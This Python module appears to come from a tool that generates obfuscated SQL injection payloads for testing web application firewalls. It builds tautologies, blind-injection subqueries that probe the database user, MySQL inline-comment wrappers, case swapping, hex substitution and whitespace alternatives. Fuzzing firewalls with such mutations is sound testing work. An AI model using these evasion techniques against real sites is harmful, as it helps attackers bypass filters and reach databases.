import re
from global_vars import input_args, benign_payloads
import random
from random_words import RandomWords
import sys

def F_tautology_number():
    n = random.randint(1, 100)
    euqal = random.choice(['=', 'like'])
    if euqal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return '{}{}{}{}{}'.format(n, spaces1, euqal, spaces2, n)

def F_tautology_string():
    n = random.randint(1, 100)
    if n < 50:
        n = F_Inline_Comment_Random()
    euqal = random.choice(['=', 'like'])
    if euqal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return "'{}'{}{}{}'{}'".format(n, spaces1, euqal, spaces2, n)

def F_tautology_complex():
    """
    === 1
    能不能再嵌套一下?
    """
    ts = [
        "select 1",
        "select user from mysql.user where case when ord(mid((select user()) from 1 for 1))=114 then 1 else 0 end",
        "select if(abs(strcmp((ascii(mid(user()from(1)for(2)))),114))-1,1,0)",
        "select find_in_set(ord(mid(user() from 1 for 1)),114)",
        "select ord('r') regexp 114",
        "select ord('r') between 114 and 115"
    ]
    euqal = random.choice(['=', 'like'])
    if euqal == '=':
        left = 0
    else:
        left = 1
    space_number = random.randint(left, 3)
    spaces1 = ' ' * space_number
    spaces2 = ' ' * space_number
    return '({}){}{}{}({})'.format(random.choice(ts), spaces1, euqal, spaces2, random.choice(ts))


def F_Inline_Comment_Random():
    """
    Return a random string to insert into the comment
    """
    if input_args.pattern == 'WAFaas' and (input_args.request_method == 'GET' or input_args.request_method == 'GET(JSON)'):
        base = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]{};:,.<>.?123456789!@$^*()_+-='
    else:
        base = 'abcdefghijklmnopqrstuvwxyz#ABCDEFGHIJKLMNOPQRSTUVWXYZ#[]{};:,.<>.?123456789!@$#%^*()_+-='
    if input_args.request_method == 'ML':
        bounds = [5,15]
    else:
        bounds = [1, 5]
    res = ''.join(random.sample(base, random.randint(bounds[0], bounds[1])))
    if not res[0] == '!':
        return res
    else:
        res = ''.join(random.sample(base, random.randint(bounds[0], bounds[1])))
        return res

def F_Inline_Comment_Benign():
    """
    Return the benign statement inserted into the comment
    """
    choices = benign_payloads
    return random.choice(choices)


def F_Inline_Comment_Random_Sentense():
    """
    随机生成一个无意义的句子
    """
    sentense = ''
    rw = RandomWords()
    for _ in range(random.randint(1, 3)):
        sentense += rw.random_word() + ' '
    return sentense


def A_Swap_Cases(token):
    """
    替换大小写
    select -> SelECt
    """
    new_token = []

    for c in token:
        if random.random() > 0.5:
            c = c.swapcase()
        new_token.append(c)

    return "".join(new_token)


def A_Inline_Comment(token):
    return "/*!" + token + "*/"


def A_Swap_Integer_Base(number):
    """
    decimal to hexadecimal
    暂时不能替换Comparision里的
    """
    replacements = [
        hex(int(number)),
        # "(SELECT {})".format(number),
    ]
    return random.choice(replacements)


def F_Whitespace_Alternatives():
    replacements = [
        ' ', "\\t", "\\n",#  "\\f", "\\v"
    ]
    return random.choice(replacements)


def F_True_Query():
    replacements = [
        '1 ',
        '(select 1) ',
        '2<>3 ',
        'True ',
    ]
    return random.choice(replacements)


def F_False_Query():
    replacements = [
        '0 ',
        '(select 0) ',
        '2=3 ',
        'False ',
    ]
    return random.choice(replacements)


def F_The_where():
    return 'where '


def F_Pipe():
    return '||'

def F_And():
    return  random.choice(['&&','and'])

def F_Space():
    return ' '
